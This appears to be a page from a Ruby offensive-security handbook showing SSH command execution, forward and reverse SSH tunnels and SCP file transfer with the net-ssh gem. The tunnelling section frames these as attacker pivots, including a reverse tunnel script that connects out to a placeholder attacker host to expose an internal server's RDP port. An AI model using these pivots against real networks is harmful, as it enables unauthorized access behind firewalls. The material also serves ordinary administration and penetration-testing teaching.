# SSH
Here we shows some SSH using ruby
we'll need to install net-ssh gem for that

```
gem install net-ssh
```

## Simple SSH command execution 
This is a very basic ssh client which sends and executes commands on a remote system 
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

@hostname = "localhost"
@username = "root"
@password = "password"
@cmd = ARGV[0]

begin
  ssh = Net::SSH.start(@hostname, @username, :password => @password)
  res = ssh.exec!(@cmd)
  ssh.close
  puts res
rescue
  puts "Unable to connect to #{@hostname} using #{@username}/#{@password}"
end
```


## SSH Tunneling

### Forward SSH Tunnel

```
                              |--------DMZ------|---Local Farm----|
                              |                 |                 |
|Attacker| ----SSH Tunnel---> | |SSH Server| <-RDP-> |Web server| |
                              |                 |                 |
                              |-----------------|-----------------|
```

Run ssh-ltnnel.rb on the **SSH Server** 

**ssh-ftunnel.rb**
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|

  ssh.forward.local('0.0.0.0', 3333, "WebServer", 3389)

  puts "[+] Starting SSH forward tunnel"
  ssh.loop { true }
end
```

Now connect to the **SSH Server** on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen

```
rdesktop WebServer:3333
```


### Reverse SSH Tunnel 
```
                              |--------DMZ------|---Local Farm----|
                              |                 |                 |
|Attacker| <---SSH Tunnel---- | |SSH Server| <-RDP-> |Web server| |
  |->-|                       |                 |                 |
                              |-----------------|-----------------|
```
Run ssh-rtnnel.rb on the **SSH Server** 

**ssh-rtunnel.rb**
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|

  ssh.forward.remote_to(3389, 'WebServer', 3333, '0.0.0.0')
  
  puts "[+] Starting SSH reverse tunnel"
  ssh.loop { true }
end
```

Now SS from the **SSH Server** to **localhost** on the localhost's ssh port then  connect from your localhost to your localhost on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen

```
rdesktop localhost:3333
```



## Copy files via SSH (SCP)

- To install scp gem
```
gem install net-scp
```

- Upload file 

```ruby
require 'net/scp'

Net::SCP.upload!(
    		        "SSHServer", 
                    "root",
                    "/rubyfu/file.txt", "/root/", 
                    #:recursive => true,    # Uncomment for recursive
                    :ssh => { :password => "123123" }
                )
```

- Download file 

```ruby
require 'net/scp'

Net::SCP.download!(
    		        "SSHServer", 
                    "root",
                    "/root/", "/rubyfu/file.txt",
                    #:recursive => true,    # Uncomment for recursive
                    :ssh => { :password => "123123" }
                  )
```




<br><br><br>
---
- [More SSH examples](http://ruby.about.com/sitesearch.htm?q=ruby+ssh&boost=3&SUName=ruby)
- [Capistranorb.com](http://capistranorb.com/)
- [Net:SSH old docs with example](http://net-ssh.github.io/ssh/v1/chapter-6.html)



